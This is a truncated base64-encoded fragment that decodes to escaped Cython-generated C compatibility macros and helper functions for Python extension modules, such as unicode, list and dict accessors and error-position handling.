pKVxuICAgICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IChsaWtlbHkoUHlVbmljb2RlX0lTX1JFQURZKHUpKSA/IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUpIDogUHlVbmljb2RlX0dFVF9TSVpFKHUpKSlcbiAgICAjZW5kaWZcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpICAgICAgUHlOdW1iZXJfQWRkKGEsIGIpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdFNhZmUoYSwgYikgIFB5TnVtYmVyX0FkZChhLCBiKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KGEsIGIpICAgICAgUHlVbmljb2RlX0NvbmNhdChhLCBiKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRTYWZlKGEsIGIpICAoKHVubGlrZWx5KChhKSA9PSBQeV9Ob25lKSB8fCB1bmxpa2VseSgoYikgPT0gUHlfTm9uZSkpID9cXFxuICAgICAgUHlOdW1iZXJfQWRkKGEsIGIpIDogX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSlcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAjaWYgIWRlZmluZWQoUHlVbmljb2RlX0RlY29kZVVuaWNvZGVFc2NhcGUpXG4gICAgI2RlZmluZSBQeVVuaWNvZGVfRGVjb2RlVW5pY29kZUVzY2FwZShzLCBzaXplLCBlcnJvcnMpICBQeVVuaWNvZGVfRGVjb2RlKHMsIHNpemUsICJ1bmljb2RlX2VzY2FwZSIsIGVycm9ycylcbiAgI2VuZGlmXG4gICNpZiAhZGVmaW5lZChQeVVuaWNvZGVfQ29udGFpbnMpXG4gICAgI2RlZmluZSBQeVVuaWNvZGVfQ29udGFpbnModSwgcykgIFB5U2VxdWVuY2VfQ29udGFpbnModSwgcylcbiAgI2VuZGlmXG4gICNpZiAhZGVmaW5lZChQeUJ5dGVBcnJheV9DaGVjaylcbiAgICAjZGVmaW5lIFB5Qnl0ZUFycmF5X0NoZWNrKG9iaikgIFB5T2JqZWN0X1R5cGVDaGVjayhvYmosICZQeUJ5dGVBcnJheV9UeXBlKVxuICAjZW5kaWZcbiAgI2lmICFkZWZpbmVkKFB5T2JqZWN0X0Zvcm1hdClcbiAgICAjZGVmaW5lIFB5T2JqZWN0X0Zvcm1hdChvYmosIGZtdCkgIFB5T2JqZWN0X0NhbGxNZXRob2Qob2JqLCAiX19mb3JtYXRfXyIsICJPIiwgZm10KVxuICAjZW5kaWZcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRm9ybWF0U2FmZShhLCBiKSAgKCh1bmxpa2VseSgoYSkgPT0gUHlfTm9uZSB8fCAoUHlVbmljb2RlX0NoZWNrKGIpICYmICFQeVVuaWNvZGVfQ2hlY2tFeGFjdChiKSkpKSA/IFB5TnVtYmVyX1JlbWFpbmRlcihhLCBiKSA6IFB5VW5pY29kZV9Gb3JtYXQoYSwgYikpXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopXFxcbiAgICAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KG9iaikgJiYgUHlfUkVGQ05UKG9iaikgPT0gMSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5U2VxdWVuY2VfTGlzdChvYmopKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0xpc3RLZWVwTmV3KG9iaikgIFB5U2VxdWVuY2VfTGlzdChvYmopXG4jZW5kaWZcbiNpZm5kZWYgUHlTZXRfQ2hlY2tFeGFjdFxuICAjZGVmaW5lIFB5U2V0X0NoZWNrRXhhY3Qob2JqKSAgICAgICAgX19QeXhfSVNfVFlQRShvYmosICZQeVNldF9UeXBlKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBBNFxuICAjZGVmaW5lIF9fUHl4X1NFVF9SRUZDTlQob2JqLCByZWZjbnQpIFB5X1NFVF9SRUZDTlQob2JqLCByZWZjbnQpXG4gICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TRVRfU0laRShvYmosIHNpemUpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1NFVF9SRUZDTlQob2JqLCByZWZjbnQpIFB5X1JFRkNOVChvYmopID0gKHJlZmNudClcbiAgI2RlZmluZSBfX1B5eF9TRVRfU0laRShvYmosIHNpemUpIFB5X1NJWkUob2JqKSA9IChzaXplKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKVxuICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSAobGlrZWx5KChpKSA+PSAwKSA/IFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKSA6IChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpXG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeVNlcXVlbmNlX0lURU0obywgaSlcbiAgI2VuZGlmXG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIFB5TGlzdF9HZXRJdGVtUmVmKG8sIGkpXG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBfX1B5eF9YTmV3UmVmKFB5TGlzdF9HZXRJdGVtKG8sIGkpKVxuICAjZW5kaWZcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgX19QeXhfTmV3UmVmKFB5TGlzdF9HRVRfSVRFTShvLCBpKSlcbiNlbmRpZlxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihkaWN0LCBrZXksIHJlc3VsdCkgUHlEaWN0X0dldEl0ZW1SZWYoZGljdCwga2V5LCByZXN1bHQpXG4jZWxpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyB8fCBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICoqcmVzdWx0KSB7XG4gICpyZXN1bHQgPSBQeU9iamVjdF9HZXRJdGVtKGRpY3QsIGtleSk7XG4gIGlmICgqcmVzdWx0ID09IE5VTEwpIHtcbiAgICBpZiAoUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19LZXlFcnJvcikpIHtcbiAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIC0xO1xuICB9XG4gIHJldHVybiAxO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeURpY3RfR2V0SXRlbVJlZihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKipyZXN1bHQpIHtcbiAgKnJlc3VsdCA9IFB5RGljdF9HZXRJdGVtV2l0aEVycm9yKGRpY3QsIGtleSk7XG4gIGlmICgqcmVzdWx0ID09IE5VTEwpIHtcbiAgICByZXR1cm4gUHlFcnJfT2NjdXJyZWQoKSA/IC0xIDogMDtcbiAgfVxuICBQeV9JTkNSRUYoKnJlc3VsdCk7XG4gIHJldHVybiAxO1xufVxuI2VuZGlmXG4jaWYgZGVmaW5lZChDWVRIT05fREVCVUdfVklTSVRfQ09OU1QpICYmIENZVEhPTl9ERUJVR19WSVNJVF9DT05TVFxuICAjZGVmaW5lIF9fUHl4X1ZJU0lUX0NPTlNUKG9iaikgIFB5X1ZJU0lUKG9iailcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfVklTSVRfQ09OU1Qob2JqKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfSVRFTShvLCBpKSBQeVNlcXVlbmNlX0lURU0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX1NJWkUoc2VxKSAgUHlfU0laRShzZXEpXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSAoUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfR0VUX0lURU0obywgaSkgUHlUdXBsZV9HRVRfSVRFTShvLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSAoUHlMaXN0X1NFVF9JVEVNKG8sIGksIHYpLCAoMCkpXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9JVEVNKG8sIGkpIFB5TGlzdF9HRVRfSVRFTShvLCBpKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0lURU0obywgaSkgUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5U2VxdWVuY2VfU2l6ZShzZXEpXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9TRVRfSVRFTShvLCBpLCB2KSBQeVR1cGxlX1NldEl0ZW0obywgaSwgdilcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKG8sIGkpIFB5VHVwbGVfR2V0SXRlbShvLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSBQeUxpc3RfU2V0SXRlbShvLCBpLCB2KVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR2V0SXRlbShvLCBpKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUobykgUHlMaXN0X0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlTZXRfR0VUX1NJWkUobykgUHlTZXRfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9HRVRfU0laRShvKSBQeUJ5dGVBcnJheV9HRVRfU0laRShvKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUobykgUHlUdXBsZV9TaXplKG8pXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9TaXplKG8pXG4gICNkZWZpbmUgX19QeXhfUHlTZXRfR0VUX1NJWkUobykgUHlTZXRfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfR0VUX1NJWkUobykgUHlCeXRlc19TaXplKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKG8pIFB5VW5pY29kZV9HZXRMZW5ndGgobylcbiNlbmRpZlxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAjZGVmaW5lIF9fUHl4X1B5SW1wb3J0X0FkZE1vZHVsZVJlZihuYW1lKSBQeUltcG9ydF9BZGRNb2R1bGVSZWYobmFtZSlcbiNlbHNlXG4gIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYoY29uc3QgY2hhciAqbmFtZSkge1xuICAgICAgUHlPYmplY3QgKm1vZHVsZSA9IFB5SW1wb3J0X0FkZE1vZHVsZShuYW1lKTtcbiAgICAgIFB5X1hJTkNSRUYobW9kdWxlKTtcbiAgICAgIHJldHVybiBtb2R1bGU7XG4gIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAhZGVmaW5lZChQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZylcbiAgI2RlZmluZSBQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZyhzKSBQeVVuaWNvZGVfRnJvbVN0cmluZyhzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5TG9uZ19Gcm9tSGFzaF90IFB5TG9uZ19Gcm9tU3NpemVfdFxuI2RlZmluZSBfX1B5eF9QeUxvbmdfQXNIYXNoX3QgICBfX1B5eF9QeUluZGV4X0FzU3NpemVfdFxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlTZW5kUmVzdWx0IFB5U2VuZFJlc3VsdFxuI2Vsc2VcbiAgICB0eXBlZGVmIGVudW0ge1xuICAgICAgICBQWUdFTl9SRVRVUk4gPSAwLFxuICAgICAgICBQWUdFTl9FUlJPUiA9IC0xLFxuICAgICAgICBQWUdFTl9ORVhUID0gMSxcbiAgICB9IF9fUHl4X1B5U2VuZFJlc3VsdDtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzXG4gIHR5cGVkZWYgX19QeXhfUHlTZW5kUmVzdWx0ICgqX19QeXhfcHlpdGVyX3NlbmRmdW5jKShQeU9iamVjdCAqaXRlciwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCk7XG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBzZW5kZnVuY1xuI2VuZGlmXG4jaWYgIUNZVEhPTl9VU0VfQU1fU0VORFxuI2RlZmluZSBfX1BZWF9IQVNfUFlfQU1fU0VORCAwXG4jZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMVxuI2Vsc2VcbiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMiAgLy8gb3VyIG93biBiYWNrcG9ydGVkIGltcGxlbWVudGF0aW9uXG4jZW5kaWZcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA8IDJcbiAgICAjZGVmaW5lIF9fUHl4X1B5QXN5bmNNZXRob2RzU3RydWN0IFB5QXN5bmNNZXRob2RzXG4jZWxzZVxuICAgIHR5cGVkZWYgc3RydWN0IHtcbiAgICAgICAgdW5hcnlmdW5jIGFtX2F3YWl0O1xuICAgICAgICB1bmFyeWZ1bmMgYW1fYWl0ZXI7XG4gICAgICAgIHVuYXJ5ZnVuYyBhbV9hbmV4dDtcbiAgICAgICAgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQ7XG4gICAgfSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdDtcbiAgICAjZGVmaW5lIF9fUHl4X1Nsb3RUcEFzQXN5bmMocykgKChQeUFzeW5jTWV0aG9kcyopKHMpKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBGMFxuICAgICNkZWZpbmUgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQgKDFVTCA8PCAyMSlcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCAoMClcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpIFB5VGhyZWFkU3RhdGVfR2V0KCktPmludGVycFxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiNpZmRlZiBfX2NwbHVzcGx1c1xuZXh0ZXJuICJDIlxuI2VuZGlmXG5QeUFQSV9GVU5DKHZvaWQgKikgUHlNZW1fQ2FsbG9jKHNpemVfdCBuZWxlbSwgc2l6ZV90IGVsc2l6ZSk7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGUoUHlPYmplY3QgKmluc3BlY3QsIGNvbnN0IGNoYXIqIG5hbWUsIGludCAqd3JpdGVfdG8pIHtcbiAgICBpbnQgdmFsdWU7XG4gICAgUHlPYmplY3QgKnB5X3ZhbHVlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhpbnNwZWN0LCBuYW1lKTtcbiAgICBpZiAoIXB5X3ZhbHVlKSByZXR1cm4gMDtcbiAgICB2YWx1ZSA9IChpbnQpIFB5TG9uZ19Bc0xvbmcocHlfdmFsdWUpO1xuICAgIFB5X0RFQ1JFRihweV92YWx1ZSk7XG4gICAgKndyaXRlX3RvID0gdmFsdWU7XG4gICAgcmV0dXJuIHZhbHVlICE9IC0xIHx8ICFQeUVycl9PY2N1cnJlZCgpO1xufVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7XG4gICAgUHlPYmplY3QgKmluc3BlY3Q7XG4gICAgaW50IHJlc3VsdDtcbiAgICBpbnNwZWN0ID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlKCJpbnNwZWN0Iik7XG4gICAgcmVzdWx0ID1cbiNpZiAhZGVmaW5lZChDT19PUFRJTUlaRUQpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX09QVElNSVpFRCIsICZDT19PUFRJTUlaRUQpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19ORVdMT0NBTFMpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX05FV0xPQ0FMUyIsICZDT19ORVdMT0NBTFMpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19WQVJBUkdTKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19WQVJBUkdTIiwgJkNPX1ZBUkFSR1MpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19WQVJLRVlXT1JEUylcbiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSS0VZV09SRFMiLCAmQ09fVkFSS0VZV09SRFMpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19BU1lOQ19HRU5FUkFUT1IpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0FTWU5DX0dFTkVSQVRPUiIsICZDT19BU1lOQ19HRU5FUkFUT1IpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19HRU5FUkFUT1IpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0dFTkVSQVRPUiIsICZDT19HRU5FUkFUT1IpICYmXG4jZW5kaWZcbiNpZiAhZGVmaW5lZChDT19DT1JPVVRJTkUpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX0NPUk9VVElORSIsICZDT19DT1JPVVRJTkUpICYmXG4jZW5kaWZcbiAgICAgICAgMTtcbiAgICBQeV9ERUNSRUYoaW5zcGVjdCk7XG4gICAgcmV0dXJuIHJlc3VsdCA/IDAgOiAtMTtcbn1cbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X2luaXRfY29fdmFyaWFibGVzKHZvaWQpIHtcbiAgICByZXR1cm4gMDsgIC8vIEl0XCdzIGEgbGltaXRlZCBBUEktb25seSBmZWF0dXJlXG59XG4jZW5kaWZcblxuXG4jaWYgZGVmaW5lZChfV0lOMzIpIHx8IGRlZmluZWQoV0lOMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUylcbiAgI2lmbmRlZiBfVVNFX01BVEhfREVGSU5FU1xuICAgICNkZWZpbmUgX1VTRV9NQVRIX0RFRklORVNcbiAgI2VuZGlmXG4jZW5kaWZcbiNpbmNsdWRlIDxtYXRoLmg+XG4jaWZkZWYgTkFOXG4jZGVmaW5lIF9fUFlYX05BTigpICgoZmxvYXQpIE5BTilcbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBmbG9hdCBfX1BZWF9OQU4oKSB7XG4gIGZsb2F0IHZhbHVlO1xuICBtZW1zZXQoJnZhbHVlLCAweEZGLCBzaXplb2YodmFsdWUpKTtcbiAgcmV0dXJuIHZhbHVlO1xufVxuI2VuZGlmXG4jaWYgZGVmaW5lZChfX0NZR1dJTl9fKSAmJiBkZWZpbmVkKF9MREJMX0VRX0RCTClcbiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jXG4jZWxzZVxuI2RlZmluZSBfX1B5eF90cnVuY2wgdHJ1bmNsXG4jZW5kaWZcblxuI2lmbmRlZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbiNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FIDBcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLXG4jZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0sgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FXG4jZW5kaWZcbiNpZiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLXG4jZGVmaW5lIF9fUFlYX01BUktfRVJSX1BPUyhmX2luZGV4LCBsaW5lbm8pICB7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfZltmX2luZGV4XTsgKHZvaWQpIF9fcHl4X2ZpbGVuYW1lOyBfX3B5eF9saW5lbm8gPSBsaW5lbm87ICh2b2lkKSBfX3B5eF9saW5lbm87IF9fcHl4X2NsaW5lbm8gPSBfX0xJTkVfXzsgKHZvaWQpIF9fcHl4X2NsaW5lbm87IH1cbiNlbHNlXG4jZGVmaW5lIF9fUFlYX01BUktfRVJSX1BPUyhmX2luZGV4LCBsaW5lbm8pICB7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfZltmX2luZGV4XTsgKHZvaWQpIF9fcHl4X2ZpbGVuYW1lOyBfX3B5eF9saW5lbm8gPSBsaW5lbm87ICh2b2lkKSBfX3B5eF9saW5lbm87ICh2b2lkKSBfX3B5eF9jbGluZW5vOyB9XG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfRVJSKGZfaW5kZXgsIGxpbmVubywgTG5fZXJyb3IpIFxcXG4gICAgeyBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSBnb3RvIExuX2Vycm9yOyB9XG5cbiNpZmRlZiBDWVRIT05fRVhURVJOX0NcbiAgICAjdW5kZWYgX19QWVhfRVhURVJOX0NcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIENZVEhPTl9FWFRFUk5fQ1xuI2VsaWYgZGVmaW5lZChfX1BZWF9FWFRFUk5fQylcbiAgICAjaWZkZWYgX01TQ19WRVJcbiAgICAjcHJhZ21hIG1lc3NhZ2UgKCJQbGVhc2UgZG8gbm90IGRlZmluZSB0aGUgXCdfX1BZWF9FWFRFUk5fQ1wnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSBcJ0NZVEhPTl9FWFRFUk5fQ1wnIGluc3RlYWQuIilcbiAgICAjZWxzZVxuICAgICN3YXJuaW5nIFBsZWFzZSBkbyBub3QgZGVmaW5lIHRoZSBcJ19fUFlYX0VYVEVSTl9DXCcgbWFjcm8gZXh0ZXJuYWxseS4gVXNlIFwnQ1lUSE9OX0VYVEVSTl9DXCcgaW5zdGVhZC5cbiAgICAjZW5kaWZcbiNlbHNlXG4gICNpZmRlZiBfX2NwbHVzcGx1c1xuICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgZXh0ZXJuICJDIlxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QWVhfRVhURVJOX0MgZXh0ZXJuXG4gICNlbmRpZlxuI2VuZGlmXG5cbiNkZWZpbmUgX19QWVhfSEFWRV9fbnFcbiNkZWZpbmUgX19QWVhfSEFWRV9BUElfX25xXG5cbiNpZmRlZiBfT1BFTk1QXG4jaW5jbHVkZSA8b21wLmg+XG4jZW5kaWYgXG5cbiNpZiBkZWZpbmVkKFBZUkVYX1dJVEhPVVRfQVNTRVJUSU9OUykgJiYgIWRlZmluZWQoQ1lUSE9OX1dJVEhPVVRfQVNTRVJUSU9OUylcbiNkZWZpbmUgQ1lUSE9OX1dJVEhPVVRfQVNTRVJUSU9OU1xuI2VuZGlmXG5cbiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgMFxuI2RlZmluZSBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4IDBcbiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcgIiJcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZyBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmdcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRnJvbVN0cmluZ0FuZFNpemUgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZVxuI2RlZmluZSBfX1B5eF91Y2hhcl9jYXN0KGMpICgodW5zaWduZWQgY2hhciljKVxuI2RlZmluZSBfX1B5eF9sb25nX2Nhc3QoeCkgKChsb25nKXgpXG4jZGVmaW5lIF9fUHl4X2ZpdHNfUHlfc3NpemVfdCh2LCB0eXBlLCBpc19zaWduZWQpICAoXFxcbiAgICAoc2l6ZW9mKHR5cGUpIDwgc2l6ZW9mKFB5X3NzaXplX3QpKSAgfHxcXFxuICAgIChzaXplb2YodHlwZSkgPiBzaXplb2YoUHlfc3NpemVfdCkgJiZcXFxuICAgICAgICAgIGxpa2VseSh2IDwgKHR5cGUpUFlfU1NJWkVfVF9NQVggfHxcXFxuICAgICAgICAgICAgICAgICB2ID09ICh0eXBlKVBZX1NTSVpFX1RfTUFYKSAgJiZcXFxuICAgICAgICAgICghaXNfc2lnbmVkIHx8IGxpa2VseSh2ID4gKHR5cGUpUFlfU1NJWkVfVF9NSU4gfHxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2ID09ICh0eXBlKVBZX1NTSVpFX1RfTUlOKSkpICB8fFxcXG4gICAgKHNpemVvZih0eXBlKSA9PSBzaXplb2YoUHlfc3NpemVfdCkgJiZcXFxuICAgICAgICAgIChpc19zaWduZWQgfHwgbGlrZWx5KHYgPCAodHlwZSlQWV9TU0laRV